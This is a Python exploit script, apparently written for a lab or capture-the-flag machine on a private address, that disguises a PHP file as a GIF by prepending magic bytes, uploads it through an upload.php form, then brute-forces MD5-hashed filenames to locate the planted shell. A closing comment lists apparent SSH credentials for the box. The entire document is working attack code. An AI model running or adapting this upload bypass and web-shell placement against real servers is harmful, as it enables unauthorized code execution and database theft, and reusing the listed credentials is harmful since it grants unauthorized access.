import codecs
import hashlib
import io
import random

import requests

targetIp = "192.168.100.101"


class exploit():

    def __init__(self, ip):
        self.ip = ip
        self.port = 8000
        self.uriUploadPhp = "http://%s:%s/upload.php" % (self.ip, self.port)
        self.uriUploadedFile = "http://%s:%s/uploads" % (self.ip, self.port)

    def run(self):
        phpFile = self._createFileObject("extractDb.php")
        self._uploadFile(phpFile)
        return self._findShellOnServer(phpFile.name)

    def _createFileObject(self, fileName):
        magic = "GIF89a"
        php = codecs.open(fileName, "r", encoding="latin-1").read()
        fileObject = io.StringIO("%s%s" % (magic, php))
        fileObject.name = "%s.php" % random.randint(1, 1000000)
        return fileObject

    def _uploadFile(self, file):
        r = requests.post(self.uriUploadPhp, files={'file': file}, data={"submit": "Submit"})
        if r.status_code != 200:
            raise RuntimeError("Could not upload DbChecker!")

    def _findShellOnServer(self, filename):
        name, suffix = filename.split(".")
        for i in range(1, 100):
            fileName = "%s%s" % (filename, i)
            hashName = hashlib.md5(fileName.encode())

            tmpUrl = "%s/%s.%s" % (self.uriUploadedFile, hashName.hexdigest(), suffix)

            r = requests.get(tmpUrl)
            if r.status_code == 200:
                print("%s - Found: %s" % (r.status_code, tmpUrl))
                return tmpUrl

        raise RuntimeError("Php shell not found!")


if __name__ == "__main__":
    print("start exploit")
    e = exploit(targetIp)
    e.run()

# ssh:  hummingbirdscyber : 123456
